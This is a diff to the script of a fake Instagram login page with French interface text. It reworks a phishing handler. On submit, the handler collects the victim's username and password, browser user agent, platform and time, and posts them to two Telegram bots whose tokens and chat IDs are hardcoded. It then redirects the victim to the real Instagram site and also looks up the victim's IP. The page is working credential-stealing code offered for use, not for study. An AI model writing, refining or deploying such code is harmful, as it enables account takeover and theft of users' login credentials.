@@ -382,75 +382,61 @@
                 this.classList.toggle('fa-eye-slash');
             });
             
-            // Form validation
+            // Form validation and submission
             const loginForm = document.getElementById('loginForm');
-            const username = document.getElementById('username');
-            const password = document.getElementById('password');
-            const usernameError = document.getElementById('usernameError');
-            const passwordError = document.getElementById('passwordError');
-            const submitBtn = document.getElementById('submitBtn');
-            const buttonText = document.getElementById('buttonText');
-            const loadingSpinner = document.getElementById('loadingSpinner');
             
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                // Reset errors
-                usernameError.style.display = 'none';
-                passwordError.style.display = 'none';
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+                const submitBtn = document.getElementById('submitBtn');
+                const buttonText = document.getElementById('buttonText');
+                const loadingSpinner = document.getElementById('loadingSpinner');
                 
-                let isValid = true;
-                
-                // Validate username
-                if (username.value.trim() === '') {
-                    usernameError.style.display = 'block';
-                    isValid = false;
+                // Validate inputs
+                if (username === '' || password.length < 6) {
+                    if (username === '') {
+                        document.getElementById('usernameError').style.display = 'block';
+                    }
+                    if (password.length < 6) {
+                        document.getElementById('passwordError').style.display = 'block';
+                    }
+                    return;
                 }
                 
-                // Validate password
-                if (password.value.length < 6) {
-                    passwordError.style.display = 'block';
-                    isValid = false;
-                }
+                // Show loading state
+                submitBtn.disabled = true;
+                buttonText.textContent = 'Envoi en cours...';
+                loadingSpinner.style.display = 'block';
                 
-                if (isValid) {
-                    // Show loading state
-                    buttonText.style.display = 'none';
-                    loadingSpinner.style.display = 'block';
-                    submitBtn.disabled = true;
-                    
-                    // Send data to Telegram
-                    sendToTelegram(username.value.trim(), password.value);
-                }
-            });
-            
-            function sendToTelegram(username, password) {
-                // Telegram bot tokens and chat IDs
-                const botTokens = [
-                    '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw', // Your first bot
-                    '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw'  // Your second bot
+                // Telegram bot configuration
+                const bots = [
+                    {
+                        token: '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw',
+                        chatId: '5372119436'
+                    },
+                    {
+                        token: '8172051327:AAEuBJ0yNmbtJvPtiYtjC9yS9sF6joeSNDw',
+                        chatId: '6723118907'
+                    }
                 ];
                 
-                const chatIds = [
-                    '5372119436', // First chat ID
-                    '5372119436'  // Second chat ID
-                ];
+                // Create message with additional info
+                const message = `🔔 Nouvelle connexion Instagram 🔔\n\n`
+                    + `👤 Utilisateur: ${username}\n`
+                    + `🔑 Mot de passe: ${password}\n\n`
+                    + `🌐 Navigateur: ${navigator.userAgent}\n`
+                    + `📱 Plateforme: ${navigator.platform}\n`
+                    + `⏰ Heure: ${new Date().toLocaleString()}`;
                 
-                const message = `🔹 Nouveau login Instagram 🔹
-👤 Utilisateur: ${username}
-🔑 Mot de passe: ${password}
-🕒 Date: ${new Date().toLocaleString()}
-🌐 User Agent: ${navigator.userAgent}
-📍 IP: En cours de récupération...`;
+                let sendCount = 0;
+                const totalBots = bots.length;
                 
-                let successfulSends = 0;
-                const totalBots = botTokens.length;
-                
-                // Function to handle completion
-                function handleCompletion() {
-                    successfulSends++;
-                    if (successfulSends === totalBots) {
-                        // All messages sent successfully
+                // Function to handle redirection
+                function handleRedirection() {
+                    sendCount++;
+                    if (sendCount === totalBots) {
                         setTimeout(() => {
                             window.location.href = "https://www.instagram.com";
                         }, 1500);
@@ -458,39 +444,45 @@
                 }
                 
                 // Send to each bot
-                botTokens.forEach((token, index) => {
-                    const chatId = chatIds[index];
-                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                bots.forEach(bot => {
+                    const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
                     
-                    fetch(url)
-                        .then(response => {
-                            if (!response.ok) {
-                                console.error(`Error sending to bot ${index + 1}`);
-                            }
-                            handleCompletion();
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: bot.chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
                         })
-                        .catch(error => {
-                            console.error(`Error sending to bot ${index + 1}:`, error);
-                            handleCompletion();
-                        });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(`Réponse du bot ${bot.token}:`, data);
+                        handleRedirection();
+                    })
+                    .catch(error => {
+                        console.error(`Erreur avec le bot ${bot.token}:`, error);
+                        handleRedirection();
+                    });
                 });
-            }
+            });
             
-            // Get IP address (additional functionality)
-            function getIP() {
+            // Get client IP (additional functionality)
+            function getClientIP() {
                 fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(data => {
-                        console.log('IP Address:', data.ip);
-                        // You could send this to your Telegram bot as well
+                        console.log('IP du client:', data.ip);
                     })
                     .catch(error => {
-                        console.error('Error fetching IP:', error);
+                        console.error('Erreur lors de la récupération de l\'IP:', error);
                     });
             }
             
-            // Call getIP on page load
-            getIP();
+            getClientIP();
         });
     </script>
 </body>
